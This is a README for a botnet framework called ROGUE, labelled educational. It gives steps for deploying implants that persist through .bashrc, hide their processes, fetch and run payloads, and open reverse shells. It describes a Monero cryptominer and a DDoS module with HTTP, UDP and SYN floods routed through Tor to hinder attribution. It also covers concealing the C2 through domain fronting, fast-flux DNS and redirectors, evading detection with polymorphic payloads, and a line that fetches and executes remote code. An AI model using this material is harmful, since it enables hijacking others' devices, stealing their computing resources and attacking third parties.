# r0gue

ROGUE is a customizable, educational & manually-deployed command-and-control (C2) botnet framework built for secure multi-device orchestration. It supports encrypted communication using AES, with optional peer-to-peer fallback if the primary C2 is unreachable.  
ROGUE supports implants on Linux, Raspberry Pi, Termux (Android), and iOS environments. 
This botnet is intended as a lerning tool for the user.
use your leet hacker skills to make this botnet more verbose.

---

## Installation

To clone ROGUE from your Kali system, run:

```bash
git clone https://github.com/ekomsSavior/rogue.git
cd rogue
```

Install dependencies manually:

```bash
sudo apt update
sudo apt install python3 
sudo apt install  python3-pycryptodome  
```

---

## File Structure

- `rogue_c2.py` – Encrypted command-and-control server
- `rogue_implant.py` – Bot implant for manual deployment with trigger handling, payload loader, and stealth logic
- `payloads/` – Folder containing executable modules such as:
  - `mine.py`: Real CPU-based cryptocurrency miner with pool config and resource control
  - `ddos.py`: Threaded DDoS engine supporting HTTP, TCP SYN, and UDP floods

---

## Usage

- Before you start, create a 16 byte key, save it and modify your rogue_c2.py and rogue_implant.py to reflect your 16 byte key across all devices connected to the botnet.

### Start the C2 Server

On your Kali controller machine:

```bash
python3 rogue_c2.py
```

### Deploy a Bot Implant

1. Copy `rogue_implant.py` to the target device.
2. Edit the `C2_HOST` and `PAYLOAD_REPO` variable in the script to match your controller’s IP.
3. Run the implant:

```bash
python3 rogue_implant.py
```

The implant will:
- Connect to the C2 server using AES-encrypted commands
- Attempt peer-to-peer fallback discovery if the C2 is unreachable
- Stealth itself using renamed process titles and hidden payload storage
- Persist by injecting itself into the target’s `.bashrc`

### Host Payloads

To serve payloads for bots to fetch:

```bash
cd payloads/
python3 -m http.server 8000
```
## Command Syntax

Once bots are connected to the C2, you can interact with them using the terminal interface.

You can issue commands to all bots at once, or use the `target <index>` syntax to control a specific bot.

### Core Commands:

```text
load_payload mine.py
```
Instructs the bot to download `mine.py` from your HTTP payload server.

```text
run_payload mine.py
```
Executes the downloaded `mine.py` miner on the bot.

```text
reverse_shell
```
Opens a reverse shell session from the bot to your C2.  
You must be listening on port `9001` with:

```bash
nc -lvnp 9001
```

### Triggered Payload Commands:

```text
trigger_mine
```
Tells all bots to run `mine.py` without needing to manually load it.  
Implants must have previously fetched this payload or auto-load it on trigger.

```text
trigger_ddos
```
Tells all bots to launch the `ddos.py` module.

You can also manually specify the DDoS target like so:

```text
run_payload ddos.py trigger_ddos <target_ip> <port> <duration> <threads> <mode>
```

#### Example:

```text
run_payload ddos.py trigger_ddos 192.168.0.99 80 60 150 http
```

This launches an HTTP flood attack on `192.168.0.99:80` for 60 seconds using 150 threads.

### DDoS Modes Available:

| Mode  | Description                            |
|-------|----------------------------------------|
| http  | HTTP GET flood with rotating headers   |
| udp   | Raw UDP packet spam                    |
| tcp   | TCP SYN flood                          |

> Note: Ensure `ddos.py` and `mine.py` are hosted and visible to the bots via your payload server (typically served on port `8000`).

---

Need to test payload access?

From the bot:

```bash
curl http://<C2_IP>:8000/mine.py
```

If the file downloads, the bot should be able to fetch it successfully.


Tor Support (Optional)

Built into ddos.py, you can enable routing DDoS traffic through Tor SOCKS5 by setting: 

```bash
USE_TOR = True
```
This uses PySocks to route all flood traffic through 127.0.0.1:9050, the default local Tor proxy.

Install Tor + PySocks:

```bash
sudo apt install tor
pip3 install pysocks
```

Then start Tor:

```bash
sudo systemctl start tor@default
```

And run the DDoS module as usual:

```bash
python3 ddos.py trigger_ddos <target> <port> <duration> <threads> <mode>
```
---

## Maintaining Bots

- ROGUE implants require Python3 and internet/network access
- Ensure `rogue_c2.py` is running to accept bot connections
- Keep your `payloads/` server online and accessible
- Update your payloads regularly for improved capabilities or evasion

---

## Payload Details

### `mine.py`

- Real CPU-based Monero miner
- Supports pool config, wallet input, and resource throttling
- Threaded hashing with runtime duration control
- Cakewallet supports xmr MONERO. edit your mine.py with your XMR MONERO address
  https://cakewallet.com/

### `ddos.py`

- Supports multiple attack modes:
  - HTTP GET flood with user-agent rotation
  - UDP flood to arbitrary ports
  - TCP SYN flood
- CLI-style arguments allow flexible targeting from C2
- Tor Benefits in DDoS Mode
  - IP obfuscation via exit nodes
  - Makes attribution and detection harder during stress testing
  - Compatible with all http, tcp, and udp flood types

---

## Disclaimer

Do not deploy ROGUE on any device, network, or system you do not own or have explicit permission to operate on. Unauthorized use of this software may violate laws. This framework is provided for educational and ethical research purposes only. The developers assume no liability and provide this software without warranty or support.

---
## Extending Rogue Capabilities

Rogue is a modular Command and Control (C2) framework designed for educational purposes. While it provides a foundational setup, users can enhance its capabilities to better understand advanced botnet operations. Below are some suggestions:

## Obfuscating the C2 Server

Hosting a C2 server locally can expose your IP address. To mitigate this:

## Use Redirectors: Deploy intermediary servers that forward traffic to your main C2 server, masking its true location.

Ngrok – Instantly tunnels your localhost server to a public domain (https://yourc2.ngrok.io). Very noob-friendly and perfect for testing. https://ngrok.com

Cloudflare Workers – Deploy lightweight scripts that forward requests to your hidden backend C2. Useful for HTTPS masking. https://workers.cloudflare.com

Redirector VPS – Spin up a cheap cloud VPS (like on DigitalOcean or Vultr) and run a simple Python Flask or Nginx proxy that forwards all traffic to your C2.

Socat or iptables – On a Linux box, use socat or iptables to transparently forward ports to your real listener.
	
 ## Domain Fronting: Leverage content delivery networks (CDNs) to disguise C2 traffic as legitimate web traffic.

Examples & Tools:

 CDNs that (used to) support it: Google App Engine (google.com fronted to your appspot URL), Amazon CloudFront, Azure.
 
 Tools:

meek (used by Tor bridges)

reGeorg or chisel (can tunnel through fronted domains if the server is set up right)

GhostTunnel – A more advanced domain fronting tunneler: https://github.com/sensepost/ghosttunnel

⚠️ Most major CDNs now block domain fronting, so you’ll need to hunt for smaller ones or find custom hosting that allows it.
 
## Fast-Flux DNS: Implement rapid IP address changes associated with a single domain to evade detection.

Examples & Tools:

	 Namecheap or Njalla – Register a domain and use dynamic DNS APIs to rotate IPs.
 
 	DuckDNS or No-IP – Free dynamic DNS services you can abuse for flux-like behavior. https://duckdns.org, https://noip.com
 
 	Fluxion or Custom Scripts – Use cronjobs or scripts that auto-update DNS records with nsupdate or provider APIs every few minutes.
 
 	Botnet-like CDN Rotation – Advanced: deploy C2 proxies across multiple bot-infected hosts and use a DNS script to cycle which one answers.

 Tor Hidden Services: Host your C2 server as a Tor hidden service to anonymize its location.

## Integrating Alternative Communication Channels

Diversify C2 communication methods:
	
 	•	Discord Webhooks: Utilize Discord’s webhook feature to send and receive commands or data.
	
 	•	Email Protocols: Implement SMTP or IMAP protocols for command dissemination.
	
 	•	Social Media Platforms: Leverage platforms like Twitter or Reddit for command and control by monitoring specific posts or messages.
 
## Enhancing Payload Encryption

To prevent payload detection:

XOR Obfuscation: 

Apply XOR operations to obfuscate payloads, making static analysis more challenging.
 
Polymorphic Techniques: Modify the payload’s code structure without altering its functionality to evade signature-based detection.

## Implementing Advanced Features

For a more robust framework:

Dynamic Command Execution: Allow bots to execute commands fetched from remote servers dynamically.

Implementation Examples:

-GitHub Gist Command Source: Each bot checks a specific public Gist every 5 minutes.

```bash
import requests
exec(requests.get("https://gist.githubusercontent.com/username/gistid/raw").text)
```

Usage: You can update the Gist anytime to change behavior.

Obfuscation Tip: Host encrypted commands and decode before executing.

-Discord Bot Polling

	 Bots fetch commands from a Discord channel via a bot token:

 	Use a private channel for commands like mine now, ddos 1.1.1.1

 	parse messages using discord.py

-Pastebin / GitHub Raw / Tor .onion Links

 Bots fetch code or instructions from:

    https://pastebin.com/raw/abc123

    https://raw.githubusercontent.com/ekomsSavior/rogue-control/main/instruct.txt

    http://yourc2hidden.onion/instructions


Automated Updates: Implement mechanisms for bots to receive and apply updates automatically.

## Other ideas to extend your personal Rogue Botnet:

Signed Command Files: Validate instructions to prevent hijacking.

Stealth Control Loop: Use sleep + jitter to avoid detection while polling.

Add support for windows enviroments.

Disclaimer: These enhancements are intended for educational and research purposes only. 
Unauthorized use of such techniques can be illegal and unethical. 
Users are responsible for ensuring compliance with all applicable laws and regulations.

